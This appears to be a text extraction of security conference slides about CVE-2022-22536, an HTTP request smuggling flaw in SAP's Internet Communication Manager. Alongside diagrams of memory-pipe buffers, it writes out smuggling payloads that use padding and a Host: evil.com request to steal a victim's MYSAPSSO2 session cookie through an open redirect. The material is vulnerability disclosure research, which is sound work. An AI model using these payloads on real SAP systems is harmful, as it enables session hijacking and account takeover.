Internal Server Error: 
Exploiting Inter-Process Communication in 
SAP's HTTP Server
Martin Doyhenard
Security Researcher @ 
Onapsis
●
Business Processes software 
○
Operations
○
Financials
○
Human Capital
○
Customer Relationship
○
Supply Chain
●
Over 400,000+ Customers (90% Fortune-500)
●
Based on Web Services through HTTP (Java and ABAP)
●
Proprietary HTTP Server: Internet Communication Manager
https://meritotech.com/wp-content/uploads/2022/01/SAP-Imag.jpg
Internet Communication Manager
●
Handles all communication of the SAP System with its clients and the outside world
●
Protocols: HTTP, P4, IIOP, SMTP and others
●
HTTP present by default in all SAP installations (Java, ABAP, WebDispatcher, S/4Hana)
ICM HTTP WorkFlow
ICM Worker 
Thread
JAVA / ABAP 
Process
HTTP Parser
HTTP Handlers
CLIENT
Memory Pipe
HTTP Request
HTTP Request
ICM Memory Pipes
●
MPI is an API/Framework to support exchange of data between ICM and Java/ABAP process
●
Requests/Responses are placed in Shared Memory and accessed using MPI pointers
●
MPI Buffers are ﬁxed size (2^16 by default) and are reserved and freed by a Worker Thread
ICM WT
Java / ABAP
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Shared Memory
MPI Buffer
ICM WT 
I/O Handler
GET / HTTP/1.1
….
ICM WT
Java / ABAP
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Shared Memory
Free MPI Buffer
GET / HTTP/1.1
HTTP/1.1 OK
MPI Buffer
HTTP/1.1 OK
ICM WT 
I/O Handler
HTTP/1.1 OK
….
ICM HTTP WorkFlow
●
MPI is an API/Framework to support exchange of data between ICM and Java/ABAP process
●
Requests/Responses are placed in Shared Memory and accessed using MPI pointers
●
MPI Buffers are ﬁxed size (2^16 by default) and are reserved and freed by a Worker Thread
ICM WT
Java / ABAP
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Shared Memory
Free MPI Buffer
Free MPI Buffer
HTTP/1.1 OK
ICM WT 
I/O Handler
HTTP/1.1 OK
….
ICM HTTP WorkFlow
●
MPI is an API/Framework to support exchange of data between ICM and Java/ABAP process
●
Requests/Responses are placed in Shared Memory and accessed using MPI pointers
●
MPI Buffers are ﬁxed size (2^16 by default) and are reserved and freed by a Worker Thread
ICM HTTP Handlers
●
Method and URL determines which Internal Handlers will be called
●
When a Handler generates a Response, all others are removed.
Cache Handler
Admin Handler
Authentication Handler
File Access Handler
Modification Handler
Redirect Handler
JAVA Handler
ABAP Handler
Internal 
Handlers
I/O Handler
ICM Internal Handlers
Cache Handler
Admin Handler
Java/ABAP Handler
ICM WT
Java / ABAP
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Shared Memory
MPI Buffer
GET /sap/admin
Cache Handler
Admin Handler
HTTP/1.1 OK 200
….
GET /sap/admin/aaa
….
I/O Handler
ICM WT
Java / ABAP
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Shared Memory
MPI Buffer
GET /sap/admin
Admin Handler
HTTP/1.1 OK 200
….
HTTP/1.1 OK 200
….
ICM Internal Handlers
I/O Handler
Multi-Buffer Messages
●
What if an HTTP Message is bigger than a ﬁxed size MPI Buffer (65455)?
●
Internal Handlers only need headers (smaller than 65K)
ICM WT
GET / HTTP/1.1
Content-Length:66000
….
Java / ABAP
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Shared Memory
MPI Buffer
REQ first ~ 2^16
Cache Handler
Java/ABAP Handler
Java/ABAP Handler
MPI Buffer
Rest of REQ
HTTP/1.1 OK
….
More Request Body
….
I/O Handler
ICM WT
Java / ABAP
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Shared Memory
MPI Buffer
REQ first ~ 2^16
Java/ABAP Handler
MPI Buffer
Rest of REQ
HTTP/1.1 OK
MPI Buffer
HTTP/1.1 OK
HTTP/1.1 OK 200
….
Multi-Buffer Messages
ICM WT
Java / ABAP
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Shared Memory
I/O Handler
HTTP/1.1 OK 200
….
Multi-Buffer Messages
MPI Desynchronization: CVE-2022-22536
I/O Handler
ICM WT
GET /sap/admin 
HTTP/1.1
Content-Length:66000
….
Java / ABAP
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Shared Memory
MPI Buffer
REQ first ~ 2^16
MPI Desynchronization
….
More Request Body
….
Cache Handler
Admin Handler
Java/ABAP Process
Cache Handler
Admin Handler
HTTP/1.1 OK 200
….
I/O Handler
ICM WT
….
More Request Body
….
Java / ABAP
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Shared Memory
MPI Buffer
REQ first ~ 2^16
Admin Handler
HTTP/1.1 OK 200
….
HTTP/1.1 OK 200
….
MPI Desynchronization
I/O Handler
ICM WT
Java / ABAP
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Free MPI Buffer
Shared Memory
MPI Buffer
More Req Body
….
More Request Body
….
MPI Desynchronization
ICM HTTP Smuggling
●
Request is splitted if:
○
Resolved by an Internal Handler
○
Size of body + headers is greater than 65455
●
All Proxies will consider the payload as one isolated Request (RFC compliant)
GET /sap/admin/public/default.html HTTP/1.1
Host: SapSystem.com
Content-Lenght: 65417
(A*65370)GET /smuggled HTTP/1.1
Host: SapSystem.com
GET /some/cached/url HTTP/1.1
Host: SapSystem.com
Padding: 
Content-Lenght: 47
GET /smuggled HTTP/1.1
Host: SapSystem.com
GET /sap/admin/public/default.html HTTP/1.1
Host: SapSystem.com
Content-Lenght: 65417
(A*65370)GET /smuggled HTTP/1.1
Host: SapSystem.com
GET /some/cached/url HTTP/1.1
Host: SapSystem.com
Padding: 
Content-Lenght: 47
GET /smuggled HTTP/1.1
Host: SapSystem.com
ICM HTTP Smuggling
●
/nwa is an App which redirects a user to a login URL. It provides 2 interesting features:
○
Open Redirect: The Host header is used to build the redirect Location.
○
Params reﬂection: It reﬂects as query string either the body (POST) or query string (GET)
●
Hijacking victim’s requests and session cookies
ATTACKER
PROXY
ICM
PAYLOAD
POST NWA
GET X
GET /sap/admin/public/default.html HTTP/1.1
Host: SapSystem.com
Content-Lenght: 65478
(A*65370)POST /nwa HTTP/1.1
Host: evil.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100
GET /sap/admin/public/default.html HTTP/1.1
Host: SapSystem.com
Content-Lenght: 65478
(A*65370)POST /nwa HTTP/1.1
Host: evil.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100
ICM HTTP Smuggling
ATTACKER
PROXY
ICM
POST NWA
RESP
RESP
POST /nwa HTTP/1.1
Host: evil.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100
HTTP/1.1 200 OK
server: SAP NetWeaver Application Server
content-length: 4497
content-type: text/html
connection: Keep-Alive
...
●
Hijacking victim’s requests and session cookies
ICM HTTP Smuggling
VICTIM
PROXY
ICM
GET /
POST NWA
GET /
POST /nwa HTTP/1.1
Host: evil.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100
GET / HTTP/1.1
Host: SapSystem.com
Cookies: 
MYSAPSSO2=secret_SAP_Session123456;
User-Agent: Victim Browser 1.0
Accept: text/html
Accept-Language: en-US,en;q=0.9
...
POST /nwa HTTP/1.1
Host: evil.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100
GET / HTTP/1.1
Host: SapSystem.com
Cookies: MYSAPSSO2=secret_SAP_Session123456;
User-Agent: Victim Browser 1.0
...
POST /nwa HTTP/1.1
Host: evil.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100
GET / HTTP/1.1
Host: SapSystem.com
Cookies: MYSAPSSO2=secret_SAP_Session123456;
User-Agent: Victi m Browser 1.0
...
●
Hijacking victim’s requests and session cookies
ICM HTTP Smuggling
VICTIM
PROXY
ICM
Redir 
evil.com
GET /
Redir 
evil.com
GET /
●
Hijacking victim’s requests and session cookies
ICM HTTP Smuggling
VICTIM
EVIL.COM
GET 
/webd
GET /
GET 
/webdynpro/resources/sap.com/tc~lm~itsam~ui~mainframe~wd/FloorPl
anApp?home=true& GET%20/%20HTTP/1.1%20%20Host:%20SapSystem.com%20%
20Cookies:%20MYSAPSSO2=secret_SAP_Session123456;%20%20User-Agent:
%20Victi HTTP/1.1
Host: evil.com
Referer: http://SapSystem.com
●
Hijacking victim’s requests and session cookies
ICM HTTP Smuggling
  POST /nwa HTTP/1.1
Host: evil.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100
●
Desynchronization does not rely on HTTP headers
●
Exploitable through HTML/JS
●
DNS Rebinding to send valid custom HTTP headers (HAProxy CVE-2021-40346)
Smuggling Botnet
DEMO:
HTTP Request Smuggling
G
G